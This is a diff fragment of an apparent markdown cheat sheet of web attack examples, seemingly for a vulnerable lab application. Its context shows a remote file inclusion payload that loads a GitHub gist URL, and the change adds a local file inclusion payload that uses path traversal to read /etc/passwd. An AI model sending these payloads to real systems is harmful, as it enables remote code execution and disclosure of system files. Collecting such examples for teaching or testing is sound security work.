@@ -21,5 +21,6 @@ rfi.php?page=https://gist.githubusercontent.com/FJuette/9076c392fa2ca1fa684bea11
 ```
 
 ## LFI
-
-TODO
+```
+lfi.php?file=../../../../../../../../etc/passwd
+```
